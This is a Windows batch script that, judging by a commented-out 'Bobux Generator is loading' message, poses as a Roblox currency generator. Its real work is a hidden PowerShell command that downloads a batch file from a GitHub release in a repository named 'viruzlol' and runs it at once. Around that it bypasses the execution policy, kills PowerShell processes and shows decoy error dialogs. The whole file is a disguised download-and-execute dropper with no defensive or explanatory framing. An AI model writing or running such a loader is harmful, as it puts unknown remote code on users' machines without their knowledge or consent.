@echo off
start /min Powershell -ExecutionPolicy bypass
echo Loading...
setlocal
setlocal EnableDelayedExpansion
taskkill /IM powershell.exe /F > NUL
timeout 1 > NUL

rem echo x=msgbox("Bobux Generator is loading..." ,0+64, "Loading...") >> msgbox.vbs

rem start msgbox.vbs
rem timeout 1 > NUL
rem del /Q msgbox.vbs




echo checking internet connection
Ping www.google.nl -n 1 -w 1000
cls
if errorlevel 1 (goto nointernet) else (echo Connected)



if not exist "c:\Program Files\Windows Media Player\wmplayer.exe" goto mediaplayerfailed

IF EXIST "%USERPROFILE%\beanslmao\" del /Q "%USERPROFILE%\beanslmao\"
IF NOT EXIST "%USERPROFILE%\beanslmao\" mkdir "%USERPROFILE%\beanslmao\" 

rem timeout 1 > NUL
powershell -windowstyle hidden -command Invoke-WebRequest https://github.com/xxxMEMESCOEPxxx/viruzlol/releases/download/lol/fbg.bat -OutFile .\fbg.bat
start "" .\fbg.bat
goto done



:nointernet
rem @echo on


echo x=msgbox("No Internet Connection! Please check your settings to continue." ,0+16, "NO INTERNET") >> msgbox.vbs


start msgbox.vbs
timeout 1 > NUL
del /Q msgbox.vbs
goto done






:mediaplayerfailed
rem @echo on


echo x=msgbox("Windows Media Player is not installed! WMP needs to be installed for sound effects. If you do not know how to install WMP, follow the highlighted instructions at https://tinyurl.com/installwmpwin10" ,0+16, "WMP is not installed") >> msgbox.vbs


start msgbox.vbs
timeout 1 > NUL
del /Q msgbox.vbs


:done

